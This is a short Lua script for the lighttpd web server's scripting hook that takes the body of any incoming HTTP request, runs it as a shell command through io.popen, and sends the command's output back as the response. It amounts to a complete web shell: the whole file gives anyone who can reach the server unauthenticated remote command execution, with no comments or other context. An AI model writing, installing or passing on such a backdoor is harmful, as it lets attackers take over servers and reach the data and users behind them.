local r = lighty.r

if (r.req_body.collect == false) then
  return 0
end

local shellpipe = io.popen(r.req_body.get)
  re = shellpipe:read("*a")
  shellpipe:close()
if not re then
  re=""
end

r.resp_body.set(re)
return 200

